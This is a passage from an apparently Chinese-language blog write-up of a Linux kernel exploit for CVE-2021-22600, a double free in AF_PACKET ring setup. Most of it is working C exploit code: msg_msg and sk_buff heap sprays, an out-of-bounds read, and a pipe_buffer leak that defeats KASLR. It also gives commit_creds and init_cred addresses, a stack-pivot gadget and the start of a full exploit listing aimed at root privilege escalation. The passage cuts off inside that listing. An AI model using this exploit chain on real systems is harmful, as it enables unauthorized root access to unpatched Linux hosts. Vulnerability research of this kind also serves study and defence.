<li>第三次调用 setsockopt 设置 RX_RING：<ul>
<li>再次进入 <code>packet_set_ring</code> 函数，由于已经是 TPACKET_V2 协议，所以调用了 swap 函数交换了 <code>rx_owner_map</code> 和 <code>sock-&gt;rx_ring-&gt;rx_owner_map</code></li>
<li>由于 <code>packet_ring_buffer</code> 结构体的 <code>rx_owner_map</code> 成员和 <code>prb_bdqc</code> 成员属于联合体，所以 <code>sock-&gt;rx_ring-&gt;rx_owner_map</code> 和 <code>sock-&gt;rx_ring-&gt;prb_bdqc-&gt;pkbdq</code> 的值相同</li>
<li>之前 <code>packet_ring_buffer-&gt;prb_bdqc-&gt;pkbdq</code> 成为悬空指针，所以在函数结尾调用 <code>bitmap_free(rx_owner_map)</code>，等同于 free 掉 <code>sock-&gt;rx_ring-&gt;prb_bdqc-&gt;pkbdq</code> 这个悬空指针，造成 double free</li>
</ul>
</li>
</ul>
<p><strong>入侵思路</strong></p>
<p>先泄露内核基地址以绕过 KASLR，由于这里有两次 free，因此我们选择使用 <code>msg_msg + sk_buff</code> 的方法进行泄露</p>
<p>构造消息队列，并分别在每一个消息队列上发送两条消息：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; MSG_QUEUE_NUM; i++)</span><br><span class="line">&#123;</span><br><span class="line">    *(<span class="keyword">int</span> *)&amp;primary_msg.mtext[<span class="number">0</span>] = MSG_TAG;</span><br><span class="line">    *(<span class="keyword">int</span> *)&amp;primary_msg.mtext[<span class="number">4</span>] = i;</span><br><span class="line">    <span class="keyword">if</span> (write_msg(msqid[i], &amp;primary_msg, <span class="keyword">sizeof</span>(primary_msg), PRIMARY_MSG_TYPE) &lt; <span class="number">0</span>)</span><br><span class="line">        err_exit(<span class="string">&quot;failed to send primary msg!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    *(<span class="keyword">int</span> *)&amp;secondary_msg.mtext[<span class="number">0</span>] = MSG_TAG;</span><br><span class="line">    *(<span class="keyword">int</span> *)&amp;secondary_msg.mtext[<span class="number">4</span>] = i;</span><br><span class="line">    <span class="keyword">if</span> (write_msg(msqid[i], &amp;secondary_msg, <span class="keyword">sizeof</span>(secondary_msg), SECONDARY_MSG_TYPE) &lt; <span class="number">0</span>)</span><br><span class="line">        err_exit(<span class="string">&quot;failed to send secondary msg!&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (i == <span class="number">1024</span>)&#123;</span><br><span class="line">        do_free_first(socket_fd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">do_free_second(socket_fd);</span><br></pre></td></tr></table></figure>
<ul>
<li>内存布局如下：</li>
</ul>
<p><img src="/2023/12/01/msg_msg-sk_buff+pipe_buffer%20attack+CVE-2021-22600/1701342306217.png" alt="1701342306217"> </p>
<ul>
<li>由于 slub 算法的特性，kmalloc-1k 会被分配到相邻的内存空间，kmalloc-96 会被分配到相邻的内存空间，两者互不干扰</li>
<li>msg_queue，primary，secondary 通过 <code>primary_msg-&gt;m_list</code> 与 <code>secondary_msg-&gt;m_list</code> 相关联</li>
</ul>
<p>第一次堆喷：构造 UAF，堆喷 sk_buff 定位 victim 队列</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">   init_socket_array(sk_sockets);</span><br><span class="line">   <span class="built_in">puts</span>(<span class="string">&quot;[*] spray sk_buff...&quot;</span>);</span><br><span class="line"><span class="comment">/* msg_msg-&gt;m_ts从&#x27;0x400-0x30&#x27;被改为&#x27;0x400&#x27; */</span></span><br><span class="line">   build_msg((struct msg_msg *)fake_secondary_msg, *(<span class="keyword">uint64_t</span> *)<span class="string">&quot;yhellow&quot;</span>, *(<span class="keyword">uint64_t</span> *)<span class="string">&quot;yhellow&quot;</span>, VICTIM_MSG_TYPE, SECONDARY_MSG_SIZE, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">   <span class="keyword">if</span> (spray_sk_buff(sk_sockets, fake_secondary_msg, <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">       err_exit(<span class="string">&quot;failed to spray sk_buff!&quot;</span>); <span class="comment">/* 有一个sk_buff会命中UAF */</span></span><br><span class="line"></span><br><span class="line">   victim_qid = <span class="number">-1</span>;</span><br><span class="line">   <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; MSG_QUEUE_NUM; i++)</span><br><span class="line">   &#123;</span><br><span class="line">       <span class="keyword">if</span> (peek_msg(msqid[i], &amp;secondary_msg, <span class="keyword">sizeof</span>(secondary_msg), <span class="number">1</span>) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">           <span class="comment">/* 因为msg_msg被修改导致peek_msg失败(利用这一点可以定位victim_qid) */</span></span><br><span class="line">           <span class="built_in">printf</span>(<span class="string">&quot;[+] victim qid: %d\n&quot;</span>, i);</span><br><span class="line">           victim_qid = i;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">if</span> (victim_qid == <span class="number">-1</span>)</span><br><span class="line">       err_exit(<span class="string">&quot;failed to make the UAF in msg queue!&quot;</span>);</span><br></pre></td></tr></table></figure>
<ul>
<li>内存布局如下：</li>
</ul>
<p><img src="/2023/12/01/msg_msg-sk_buff+pipe_buffer%20attack+CVE-2021-22600/1701342638468.png" alt="1701342638468"> </p>
<p>第二次堆喷：堆喷 sk_buff 伪造辅助消息，泄露 primary_msg 地址</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* msg_msg-&gt;m_ts从&#x27;0x400&#x27;被改为&#x27;0x1000-0x30&#x27; */</span></span><br><span class="line">   build_msg((struct msg_msg *)fake_secondary_msg, *(<span class="keyword">uint64_t</span>*)<span class="string">&quot;yhellow&quot;</span>, *(<span class="keyword">uint64_t</span>*)<span class="string">&quot;yhellow&quot;</span>, VICTIM_MSG_TYPE, <span class="number">0x1000</span> - <span class="keyword">sizeof</span>(struct msg_msg), <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">   <span class="keyword">if</span> (spray_sk_buff(sk_sockets, fake_secondary_msg, <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">       err_exit(<span class="string">&quot;failed to spray sk_buff!&quot;</span>);</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span> (peek_msg(msqid[victim_qid], &amp;oob_msg, <span class="keyword">sizeof</span>(oob_msg), <span class="number">1</span>) &lt; <span class="number">0</span>)</span><br><span class="line">       err_exit(<span class="string">&quot;failed to read victim msg!&quot;</span>);</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span> (*(<span class="keyword">int</span> *)&amp;oob_msg.mtext[SECONDARY_MSG_SIZE+<span class="number">0x10</span>] != MSG_TAG)&#123;</span><br><span class="line">       err_exit(<span class="string">&quot;failed to rehit the UAF object!&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   nearby_msg = (struct msg_msg*)&amp;oob_msg.mtext[(SECONDARY_MSG_SIZE+<span class="number">0x10</span>) - <span class="keyword">sizeof</span>(struct msg_msg)];</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] addr of primary msg of msg nearby victim: \033[0m0x%lx\n&quot;</span>, nearby_msg-&gt;m_list.prev);</span><br></pre></td></tr></table></figure>
<ul>
<li>内存布局如下：</li>
</ul>
<p><img src="/2023/12/01/msg_msg-sk_buff+pipe_buffer%20attack+CVE-2021-22600/1701342780014.png" alt="1701342780014">  </p>
<ul>
<li>越界读取到相邻辅助消息的 <code>secondary_msg-&gt;msg_msg</code>，泄露对应 <code>primary_msg</code> 的地址</li>
</ul>
<p>第三次堆喷：堆喷 sk_buff 伪造辅助消息，泄露 UAF obj 地址</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* msg_msg-&gt;next被改为nearby_msg-&gt;m_list.prev(泄露的primary_msg地址) */</span></span><br><span class="line">   build_msg((struct msg_msg *)fake_secondary_msg, *(<span class="keyword">uint64_t</span>*)<span class="string">&quot;yhellow&quot;</span>, *(<span class="keyword">uint64_t</span>*)<span class="string">&quot;yhellow&quot;</span>, VICTIM_MSG_TYPE, <span class="keyword">sizeof</span>(oob_msg.mtext), nearby_msg-&gt;m_list.prev - <span class="number">8</span>, <span class="number">0</span>);</span><br><span class="line">   <span class="keyword">if</span> (spray_sk_buff(sk_sockets, fake_secondary_msg, <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">       err_exit(<span class="string">&quot;failed to spray sk_buff!&quot;</span>);</span><br><span class="line"></span><br><span class="line">   <span class="built_in">puts</span>(<span class="string">&quot;[*] arbitrary read on primary msg of msg nearby victim&quot;</span>);</span><br><span class="line">   <span class="keyword">if</span> (peek_msg(msqid[victim_qid], &amp;oob_msg, <span class="keyword">sizeof</span>(oob_msg), <span class="number">1</span>) &lt; <span class="number">0</span>)</span><br><span class="line">       err_exit(<span class="string">&quot;failed to read victim msg!&quot;</span>);</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span> (*(<span class="keyword">int</span> *)&amp;oob_msg.mtext[<span class="number">0x1000</span>] != MSG_TAG)</span><br><span class="line">       err_exit(<span class="string">&quot;failed to rehit the UAF object!&quot;</span>);</span><br><span class="line"></span><br><span class="line">   nearby_msg_prim = (struct msg_msg*) &amp;oob_msg.mtext[<span class="number">0x1000</span> - <span class="keyword">sizeof</span>(struct msg_msg)];</span><br><span class="line">   victim_addr = nearby_msg_prim-&gt;m_list.next - <span class="number">0x400</span>;</span><br><span class="line"></span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] addr of msg next to victim: \033[0m0x%lx\n&quot;</span>, nearby_msg_prim-&gt;m_list.next);</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] addr of msg UAF object: \033[0m0x%lx\n&quot;</span>, victim_addr);</span><br></pre></td></tr></table></figure>
<ul>
<li>内存布局如下：</li>
</ul>
<p><img src="/2023/12/01/msg_msg-sk_buff+pipe_buffer%20attack+CVE-2021-22600/1701343615421.png" alt="1701343615421">  </p>
<ul>
<li>当 <code>msg_msg data</code> 的 0x1000-0x30 空间使用完毕后，程序就会根据 <code>msg_msg-&gt;next</code> 来确定 <code>msg_msgseg data</code> 的位置</li>
<li>将 <code>msg_msg-&gt;next</code> 修改为 <code>primary_addr</code>，就可以读取并泄露 <code>primary-&gt;m_list.next</code> ，也就是 <code>secondary-&gt;msg_msg</code></li>
<li>最后减去 0x400 就得到 victim_addr 了</li>
</ul>
<p>第四次堆喷：堆喷 pipe_buffer，泄露内核基址</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">   <span class="comment">/* msg_msg-&gt;m_list被改为victim_addr(指向自身) */</span></span><br><span class="line">   build_msg((struct msg_msg *)fake_secondary_msg, victim_addr, victim_addr, VICTIM_MSG_TYPE, SECONDARY_MSG_SIZE - <span class="keyword">sizeof</span>(struct msg_msg), <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">   <span class="keyword">if</span> (spray_sk_buff(sk_sockets, fake_secondary_msg, <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">       err_exit(<span class="string">&quot;failed to spray sk_buff!&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* read_msg会导致secondary_msg被释放 */</span></span><br><span class="line">   <span class="keyword">if</span> (read_msg(msqid[victim_qid], &amp;secondary_msg, <span class="keyword">sizeof</span>(secondary_msg), VICTIM_MSG_TYPE) &lt; <span class="number">0</span>)</span><br><span class="line">       err_exit(<span class="string">&quot;failed to receive secondary msg!&quot;</span>);</span><br><span class="line"></span><br><span class="line">   <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; PIPE_NUM; i++)</span><br><span class="line">   &#123;</span><br><span class="line">       <span class="keyword">if</span> (pipe(pipe_fd[i]) &lt; <span class="number">0</span>)</span><br><span class="line">           err_exit(<span class="string">&quot;failed to create pipe!&quot;</span>);</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> (write(pipe_fd[i][<span class="number">1</span>], <span class="string">&quot;yhellow&quot;</span>, <span class="number">8</span>) &lt; <span class="number">0</span>)</span><br><span class="line">           err_exit(<span class="string">&quot;failed to write the pipe!&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   pipe_buf_ptr = (struct pipe_buffer *) &amp;fake_secondary_msg; </span><br><span class="line">   <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++)</span><br><span class="line">   &#123;</span><br><span class="line">       <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; SK_BUFF_NUM; j++)</span><br><span class="line">       &#123;</span><br><span class="line">           <span class="comment">/* 通过sk_buff读取pipe_buffer */</span></span><br><span class="line">           <span class="keyword">if</span> (read(sk_sockets[i][<span class="number">1</span>], &amp;fake_secondary_msg, </span><br><span class="line">                   <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>) </span><br><span class="line">               err_exit(<span class="string">&quot;failed to release sk_buff!&quot;</span>);</span><br><span class="line"></span><br><span class="line">           <span class="keyword">if</span> (pipe_buf_ptr-&gt;ops &gt; <span class="number">0xffffffff81000000</span>)&#123;</span><br><span class="line">               print_hex(pipe_buf_ptr,<span class="keyword">sizeof</span>(struct pipe_buffer));</span><br><span class="line">               <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] got anon_pipe_buf_ops: \033[0m%p\n&quot;</span>, pipe_buf_ptr-&gt;ops);</span><br><span class="line">               kernel_offset = (<span class="keyword">uint64_t</span>)pipe_buf_ptr-&gt;ops - <span class="number">0xffffffff8223d800</span>;</span><br><span class="line">               kernel_base = <span class="number">0xffffffff81000000</span> + kernel_offset;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] kernel base: \033[0m0x%lx \033[32m\033[1moffset: \033[0m0x%lx\n&quot;</span>, kernel_base, kernel_offset);</span><br></pre></td></tr></table></figure>
<ul>
<li>内存布局如下：</li>
</ul>
<p><img src="/2023/12/01/msg_msg-sk_buff+pipe_buffer%20attack+CVE-2021-22600/1701346455159.png" alt="1701346455159"> </p>
<ul>
<li>read_msg 没有设置 MSG_COPY，读取后便会从信息队列中释放 <code>secondary_msg</code></li>
<li>但是 <code>sk_buff</code> 中的指针并没有置空，导致 <code>pipe_buffer</code> 和 <code>sk_buff</code> 分配的区域在同一位置</li>
</ul>
<p>接下来可以考虑伪造 <code>pipe_buffer</code>，构造 ROP，劫持 RIP，完成提权</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p &amp;init_cred</span><br><span class="line">$<span class="number">1</span> = (struct cred *) <span class="number">0xffffffff82889040</span> &lt;init_cred&gt;</span><br><span class="line">pwndbg&gt; p commit_creds</span><br><span class="line">$<span class="number">2</span> = &#123;<span class="keyword">int</span> (struct cred *)&#125; <span class="number">0xffffffff810df150</span> &lt;commit_creds&gt;</span><br><span class="line">pwndbg&gt; p swapgs_restore_regs_and_return_to_usermode</span><br><span class="line">$<span class="number">3</span> = &#123;&lt;text variable, no debug info&gt;&#125; <span class="number">0xffffffff81e00fb0</span> &lt;common_interrupt_return&gt;</span><br></pre></td></tr></table></figure>
<p>栈迁移的 gadget 有点难找，需要指令错位，但好在各个版本的内核都有这个 gadget：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.text:FFFFFFFF8130245D <span class="number">8B</span> <span class="number">56</span> <span class="number">5</span>C                      mov     edx, [rsi+<span class="number">5</span>Ch]</span><br><span class="line">.text:FFFFFFFF81302460 <span class="number">85</span> D2                         test    edx, edx</span><br><span class="line">.text:FFFFFFFF81302462 <span class="number">0F</span> <span class="number">8</span>E A0 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>             jle     loc_FFFFFFFF81302508</span><br><span class="line">.text:FFFFFFFF81302462</span><br><span class="line">.text:FFFFFFFF81302468 F0 FF <span class="number">46</span> <span class="number">60</span>                   lock inc dword ptr [rsi+<span class="number">60</span>h]</span><br><span class="line">.text:FFFFFFFF8130246C <span class="number">4</span>C <span class="number">8</span>D <span class="number">6B</span> <span class="number">0</span>C                   lea     r13, [rbx+<span class="number">0</span>Ch]</span><br><span class="line">.text:FFFFFFFF81302470 <span class="number">4</span>C <span class="number">89</span> EF                      mov     rdi, r13                        ; lock</span><br><span class="line">.text:FFFFFFFF81302473 E8 E8 EE <span class="number">9</span>E <span class="number">00</span>                call    _raw_spin_lock                  ; PIC mode</span><br></pre></td></tr></table></figure>
<p>完整 exp 如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;kernelpwn.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PG_NUM 256</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PIPE_NUM 8</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MSG_QUEUE_NUM 4096</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PRIMARY_MSG_SIZE 96</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SECONDARY_MSG_SIZE 0x400-0x10</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PRIMARY_MSG_TYPE    0x31</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SECONDARY_MSG_TYPE  0x32</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> VICTIM_MSG_TYPE     0x1337</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> OTHER_MSG_TYPE      0x33</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MSG_TAG     0xAAAAAAAA</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_SIZE 0x1000</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">do_alloc_pg_vec</span><span class="params">(<span class="keyword">uint32_t</span> block_size, <span class="keyword">uint32_t</span> frame_size,</span></span></span><br><span class="line"><span class="params"><span class="function">                    <span class="keyword">uint32_t</span> block_nr, <span class="keyword">uint32_t</span> sizeof_priv, <span class="keyword">int</span> timeout)</span></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tpacket_req3</span> <span class="title">req3</span>;</span></span><br><span class="line">    <span class="built_in">memset</span>(&amp;req3, <span class="number">0</span>, <span class="keyword">sizeof</span>(req3));</span><br><span class="line">    <span class="keyword">int</span> socket_fd = socket(AF_PACKET, SOCK_RAW, PF_PACKET);</span><br><span class="line">    <span class="keyword">if</span> (socket_fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        err_exit(<span class="string">&quot;[x] failed at socket(AF_PACKET, SOCK_RAW, PF_PACKET)\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span 